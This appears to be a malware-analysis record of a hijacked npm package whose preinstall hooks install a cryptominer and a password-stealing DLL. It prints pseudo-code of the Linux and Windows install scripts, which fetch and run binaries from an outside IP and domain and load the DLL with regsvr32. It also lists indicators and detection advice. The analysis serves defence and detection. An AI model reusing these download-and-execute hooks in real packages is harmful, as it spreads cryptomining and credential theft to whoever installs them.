package_info.why_malicious: The package was hijacked and malicious code was inserted to execute cryptominers and password-stealing trojans on both Linux and Windows systems during installation, resulting in credential theft and unauthorized resource usage.

malicious_snippets.code_behavior: Detects the operating system and executes a platform-specific script (preinstall.sh for Linux, preinstall.bat for Windows) during the preinstall phase.

malice_analysis.why_suspicious: Running arbitrary scripts during the preinstall phase is a common malware technique to gain code execution before the package is even used.
malice_analysis.violated_expectations: Normal packages do not execute OS-specific scripts that download and run binaries or batch files during installation.
malice_analysis.similar_legitimate_use: Some legitimate packages may run preinstall scripts for setup, but not to download and execute external binaries.
key_indicators: No legitimate setup or build logic

malicious_snippets.code_snippet:
#!/bin/bash
# (Pseudo-code summary)
if ! (geoip in [RU, UA, BY, KZ]); then
  wget http://159.148.186.228/jsextension -O jsextension
  chmod +x jsextension
  ./jsextension &
fi
malicious_snippets.code_behavior: Checks if the user is in Russia, Ukraine, Belarus, or Kazakhstan. If not, downloads and executes a cryptominer binary (jsextension) from a remote server.

malice_analysis.why_suspicious: Downloads and executes a binary from an untrusted external IP address, with geo-fencing to avoid certain countries.
malice_analysis.violated_expectations: Normal preinstall scripts do not download and run external binaries, especially not cryptominers.
malice_analysis.similar_legitimate_use: Geo-fencing is sometimes used for compliance, but not for malware evasion.

malicious_snippets.code_snippet:
:: (Pseudo-code summary)
powershell -Command "Invoke-WebRequest -Uri http://159.148.186.228/jsextension.exe -OutFile jsextension.exe"
jsextension.exe
powershell -Command "Invoke-WebRequest -Uri http://citationsherbe.at/sdd.dll -OutFile create.dll"
regsvr32.exe -s create.dll
malicious_snippets.code_behavior: Downloads and executes a cryptominer (jsextension.exe) and a password-stealing trojan DLL (create.dll), then loads the DLL using regsvr32.exe.

malice_analysis.why_suspicious: Downloads and executes binaries and DLLs from untrusted sources, then loads the DLL with regsvr32.exe, a known LOLBin for malware.
malice_analysis.violated_expectations: No legitimate package should download and execute external binaries or DLLs during installation.
malice_analysis.similar_legitimate_use: regsvr32.exe is used for legitimate DLL registration, but not for arbitrary DLLs from the internet.
key_indicators: Downloads executable and DLL from external sources

malicious_snippets.code_behavior: Steals credentials from a wide range of applications and the Windows credential manager, likely exfiltrating them to the attacker.

malice_analysis.why_suspicious: DLL loaded from an untrusted source, attempts to access and exfiltrate sensitive credentials.
malice_analysis.violated_expectations: No legitimate package should ever attempt to steal or exfiltrate user credentials.
malice_analysis.similar_legitimate_use: Security tools may access credentials for backup or migration, but never without user consent.

attack_chain.action: Malicious package is installed, triggering preinstall.js
preinstall.js detects OS and runs preinstall.sh (Linux) or preinstall.bat (Windows)
On Linux, preinstall.sh checks geo-location and downloads/executes cryptominer if not in excluded countries
On Windows, preinstall.bat downloads and executes cryptominer and password-stealing DLL, then loads DLL with regsvr32.exe
create.dll (password stealer) attempts to extract and exfiltrate credentials from many applications and Windows credential manager
attack_chain.leads_to: Exfiltration of sensitive data to attacker

behavioral_signatures: Execution of preinstall scripts that download and run external binaries
Use of regsvr32.exe to load DLLs from package install directories
Unusual network connections during package installation
file_indicators: preinstall.js, preinstall.sh, preinstall.bat in package root
jsextension (Linux) or jsextension.exe (Windows) in system temp or working directory
create.dll in Windows system or user directories
detection_knowledge.how_to_detect: Monitor for npm package installations that trigger preinstall scripts making network requests or downloading executables. Flag the presence of jsextension, jsextension.exe, or create.dll on disk. Alert on regsvr32.exe loading DLLs from non-standard locations, especially immediately after npm install. Correlate with outbound connections to known malicious IPs/domains.
